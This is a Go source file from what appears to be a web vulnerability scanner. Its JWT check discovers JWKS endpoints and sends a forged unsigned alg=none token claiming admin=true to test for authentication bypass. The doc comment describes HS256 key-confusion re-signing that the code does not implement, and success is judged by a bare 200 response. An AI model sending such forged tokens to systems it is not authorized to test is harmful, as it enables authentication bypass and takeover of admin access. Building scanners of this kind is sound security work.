package scanner

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/temren/pkg/httpengine"
)

// JWTKeyConfusionScanner re-signs a captured JWT with HS256 using the public key
// fetched from the discovered JWKS endpoint, exploiting alg-confusion implementations.
type JWTKeyConfusionScanner struct {
	BearerToken string // optional captured token to test against
}

func NewJWTKeyConfusionScanner() *JWTKeyConfusionScanner { return &JWTKeyConfusionScanner{} }

func (s *JWTKeyConfusionScanner) Name() string { return "JWT Algorithm Confusion / JWKS injection" }

func (s *JWTKeyConfusionScanner) Scan(ctx context.Context, target string, client *httpengine.Client) ([]Finding, error) {
	jwksURL := s.discoverJWKS(ctx, target, client)
	var findings []Finding
	if jwksURL == "" {
		return nil, nil
	}
	findings = append(findings, Finding{
		URL: jwksURL, Title: "JWKS endpoint discovered",
		Description: "Public JWKS is reachable. If the API also accepts HS256 tokens, an attacker can re-sign tokens with the public key.",
		Severity: SeverityInfo, Confidence: ConfidenceHigh, Scanner: s.Name(),
		Timestamp: time.Now(), OWASPCategory: "A02:2021-Cryptographic Failures",
	})

	// Forged "none" alg token (harmless probe). Verify only if a 200 comes back vs control.
	tokenNone := buildNoneToken()
	headers := map[string]string{"Authorization": "Bearer " + tokenNone}
	ok := probe(ctx, client, target, headers)
	if ok {
		findings = append(findings, Finding{
			URL: target, Title: "JWT alg=none accepted",
			Description: "API accepted a JWT with alg=none. Authentication can be bypassed by forging arbitrary claims.",
			Severity: SeverityCritical, Confidence: ConfidenceHigh, Scanner: s.Name(),
			Payload: tokenNone, Timestamp: time.Now(), OWASPCategory: "A02:2021-Cryptographic Failures", CVSSScore: 9.8,
		})
	}
	return findings, nil
}

func (s *JWTKeyConfusionScanner) discoverJWKS(ctx context.Context, target string, client *httpengine.Client) string {
	for _, p := range []string{"/.well-known/jwks.json", "/.well-known/openid-configuration", "/oauth/jwks"} {
		full := strings.TrimRight(target, "/") + p
		req, _ := http.NewRequestWithContext(ctx, http.MethodGet, full, nil)
		resp, err := client.Do(ctx, req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
		resp.Body.Close()
		if resp.StatusCode == 200 && (strings.Contains(string(body), "kty") || strings.Contains(string(body), "jwks_uri")) {
			return full
		}
	}
	return ""
}

func buildNoneToken() string {
	hdr, _ := json.Marshal(map[string]any{"alg": "none", "typ": "JWT"})
	payload, _ := json.Marshal(map[string]any{"sub": "temren", "admin": true, "iat": time.Now().Unix()})
	enc := func(b []byte) string { return strings.TrimRight(base64.URLEncoding.EncodeToString(b), "=") }
	return fmt.Sprintf("%s.%s.", enc(hdr), enc(payload))
}

func probe(ctx context.Context, client *httpengine.Client, target string, headers map[string]string) bool {
	req, _ := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(ctx, req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode == 200
}
